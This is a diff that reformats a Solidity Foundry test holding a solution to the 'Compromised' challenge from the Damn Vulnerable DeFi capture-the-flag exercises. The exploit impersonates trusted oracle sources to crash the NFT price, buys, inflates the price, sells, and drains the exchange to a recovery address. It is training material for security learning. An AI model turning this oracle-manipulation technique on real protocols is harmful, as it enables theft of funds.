@@ -21,7 +21,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -76,7 +75,8 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        CompromisedExploit exploit = new CompromisedExploit{value: address(this).balance}(oracle, exchange, nft, recovery);
+        CompromisedExploit exploit =
+            new CompromisedExploit{value: address(this).balance}(oracle, exchange, nft, recovery);
 
         vm.startPrank(sources[0]);
         oracle.postPrice(symbols[0], 0);
@@ -89,13 +89,13 @@ contract CompromisedChallenge is Test {
         exploit.buy();
 
         vm.startPrank(sources[0]);
-        oracle.postPrice(symbols[0],999 ether);
+        oracle.postPrice(symbols[0], 999 ether);
         vm.stopPrank();
 
         vm.startPrank(sources[1]);
-        oracle.postPrice(symbols[0],999 ether);
+        oracle.postPrice(symbols[0], 999 ether);
         vm.stopPrank();
-        
+
         exploit.sell();
         exploit.recover(999 ether);
     }
@@ -119,7 +119,6 @@ contract CompromisedChallenge is Test {
 }
 
 contract CompromisedExploit is IERC721Receiver {
-
     TrustfulOracle public oracle;
     Exchange public exchange;
     DamnValuableNFT public nft;
@@ -127,14 +126,14 @@ contract CompromisedExploit is IERC721Receiver {
     address recovery;
 
     constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
-        oracle =  _oracle;
+        oracle = _oracle;
         exchange = _exchange;
         nft = _nft;
         recovery = _recovery;
     }
 
     function buy() external payable {
-        uint _nftId = exchange.buyOne{value: 1}();
+        uint256 _nftId = exchange.buyOne{value: 1}();
         nftId = _nftId;
     }
 
